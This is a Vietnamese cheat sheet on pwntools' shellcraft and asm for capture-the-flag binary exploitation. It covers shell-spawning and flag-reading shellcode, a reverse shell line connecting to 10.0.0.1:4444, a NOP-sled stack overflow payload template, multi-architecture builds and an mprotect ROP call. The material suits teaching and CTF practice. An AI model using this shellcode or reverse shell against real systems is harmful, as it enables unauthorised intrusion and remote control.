# shellcode — shellcraft & asm

Sinh shellcode **không cần viết assembly tay**: `shellcraft` tạo mã nguồn asm, `asm()` biên dịch.

> Mọi thứ phụ thuộc `context.arch/os/bits` → set `context.binary = ELF(...)` hoặc
> `context.arch = 'amd64'` **trước**.

---

## `shellcraft.*` — sinh assembly

**Công dụng:** sinh asm cho các tác vụ thường gặp (spawn shell, execve, đọc file, reverse...).
**Dạng bài:** NX off / vùng thực thi được (stack `rwx`, `mprotect`, JIT), shellcode injection.

| Hàm | Làm gì |
|-----|--------|
| `shellcraft.sh()` | spawn `/bin/sh` (execve) |
| `shellcraft.execve(path, argv, envp)` | execve tuỳ biến |
| `shellcraft.cat(path)` | đọc & in file (bài chỉ cần đọc flag) |
| `shellcraft.dupsh(fd)` | dup fd + sh (reverse/socket) |
| `shellcraft.connect(host, port)` + `.dupsh()` | reverse shell |
| `shellcraft.open/read/write(...)` | wrap syscall lẻ |
| `shellcraft.sh(cwd=...)`, `.findpeersh()` | biến thể |

```python
context.arch = 'amd64'
sc  = shellcraft.sh()                      # chuỗi ASM (text)
sc  = shellcraft.execve('/bin/sh', 0, 0)
sc  = shellcraft.cat('/flag')              # bài đọc flag không cần shell
# reverse shell
sc  = shellcraft.connect('10.0.0.1', 4444) + shellcraft.dupsh()
```

---

## `asm()` — biên dịch asm → bytes

**Công dụng:** biến asm (shellcraft hoặc tự viết) thành bytes nhét vào payload.

| Tham số | Ý nghĩa |
|---------|---------|
| `code` | chuỗi asm |
| `arch` / `os` / `bits` | ghi đè context nếu cần |
| `vma` | địa chỉ nạp (ảnh hưởng nhãn/nhảy tuyệt đối) |

```python
shellcode = asm(shellcraft.sh())           # 48 byte (amd64)
shellcode = asm("xor rdi, rdi; mov al, 60; syscall")   # tự viết (exit)
# đổi arch tại chỗ: phải set CẢ arch lẫn bits (arch='i386' KHÔNG tự đổi bits=32)
with context.local(arch='i386', bits=32):
    sc32 = asm(shellcraft.sh())            # shellcraft.sh() tự theo context.arch
```

**Khai thác điển hình (stack rwx hoặc jmp rsp):**
```python
context.binary = exe = ELF("./chall")
sc = asm(shellcraft.sh())
payload = flat(sc.ljust(offset, b'\x90'),  # NOP-sled cho đủ offset
               ret_to_shellcode_addr)       # RIP -> đầu shellcode
```

**Bản làm tay:** copy mã hex shellcode từ shell-storm/exploit-db — phụ thuộc kiến trúc, dễ dính
byte xấu, khó sửa; `shellcraft` sinh đúng arch và chỉnh được.

---

## Đa kiến trúc (ARM / AArch64 / MIPS)

**Công dụng:** sinh shellcode cho kiến trúc khác (bài embedded/mobile/router).
**Lưu ý:** đổi arch phải set **cả `bits` (và `endian` cho MIPS)**, nếu không template lỗi
`KeyError (64, 'arm', ...)`.

```python
# SINH SOURCE (text asm) — không cần assembler ngoài:
with context.local(arch='arm', bits=32):
    src = shellcraft.sh()                 # text asm ARM
with context.local(arch='aarch64'):       # aarch64 = 64-bit (khỏi set bits)
    src = shellcraft.sh()
with context.local(arch='mips', bits=32, endian='big'):
    src = shellcraft.sh()

# BIÊN DỊCH ra bytes: cần cross-binutils của arch đó
#   sudo apt install binutils-arm-linux-gnueabi binutils-mips-linux-gnu ...
with context.local(arch='arm', bits=32):
    sc = asm(shellcraft.sh())             # cần 'arm-linux-gnueabi-as'
```

| arch | `bits` | ghi chú |
|------|--------|---------|
| `i386` | 32 | x86 32-bit |
| `amd64` | 64 | mặc định |
| `arm` | 32 | cần binutils-arm để `asm()` |
| `thumb` | 32 | ARM thumb |
| `aarch64` | 64 | ARM 64-bit |
| `mips` | 32 | thêm `endian='big'`/`'little'` |

> Verify: sinh **source** ARM/MIPS/AArch64 chạy được (text). `asm()` cho ARM/MIPS cần cài
> cross-binutils — trên máy chưa cài sẽ báo `Could not find 'as'`.

---

## `disasm()` — bytes → asm (đọc ngược)

```python
print(disasm(b"\x48\x31\xff"))       # "xor rdi, rdi"
print(disasm(shellcode, vma=0x400000))
```

---

## `constants` — hằng số syscall/cờ

**Công dụng:** khỏi nhớ số syscall / cờ `PROT_*`, `O_*`. **Dạng bài:** dựng syscall tay, `mprotect`.

```python
constants.SYS_execve        # 59
constants.SYS_mprotect      # 10
constants.PROT_READ | constants.PROT_WRITE | constants.PROT_EXEC   # 0x7
constants.O_RDONLY
# dùng trong shellcraft/ROP:
rop(rax=constants.SYS_mprotect, rdi=page, rsi=0x1000, rdx=constants.PROT_READ|constants.PROT_WRITE|constants.PROT_EXEC)
```

---

## `make_elf` / `run_shellcode` — đóng gói & chạy thử

**Công dụng:** biến shellcode thành ELF chạy được để **test shellcode** trước khi nhồi.

```python
from pwnlib.elf import ELF
elf = ELF.from_bytes(asm(shellcraft.sh()))   # tạo ELF từ shellcode
elf.save("sc_test"); os.chmod("sc_test", 0o755)
# hoặc chạy nhanh:
p = run_shellcode(asm(shellcraft.sh())); p.interactive()
```

---

## Mẹo nhanh

- Luôn set `context.arch` trước `shellcraft/asm` — sai arch là sinh mã rác.
- Né byte xấu (`\x00`, `\n`): viết shellcode tránh, hoặc dùng `asm(..., )` rồi encode; kiểm bằng
  `b'\x00' in shellcode`.
- Chỉ cần flag? `shellcraft.cat('/flag')` gọn hơn spawn shell.
- Test shellcode độc lập bằng `run_shellcode()` trước khi ghép vào exploit.
